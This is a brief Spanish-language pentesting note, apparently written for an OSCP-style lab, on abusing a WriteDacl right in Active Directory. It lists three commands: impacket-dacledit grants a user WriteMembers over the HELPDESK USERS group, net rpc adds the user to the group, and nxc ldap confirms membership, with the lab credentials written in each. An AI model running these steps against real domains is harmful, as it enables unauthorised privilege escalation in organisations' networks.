# Abuso ACL 

Tags: #AD #ACL #Windows 

## WriteDalc sobre Grupo

Si tenemos esta ACL sobre un usuario, podemos modificar su ACL para realizar acciones sobre ese grupo como agregarnos.

```bash 
Paso 1:
# Otorgar permisos del usuario sobre el grupo 
❯ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'v.perry' -target-dn 'CN=HELPDESK USERS,CN=USERS,DC=OSCP,DC=EXAM' 'oscp.exam'/'v.perry':'SurfaceConditionMove441'

Paso 2:
# Agregar al grupo
❯ net rpc group addmem 'HELPDESK USERS' 'v.perry' -U oscp.exam/v.perry%SurfaceConditionMove441 -S 172.16.142.200

Paso 3:
# Confirmar que se ha agregado el usuario al grupo 
❯ nxc ldap 172.16.142.200 -u v.perry -p 'SurfaceConditionMove441' --groups 'HELPDESK USERS'
```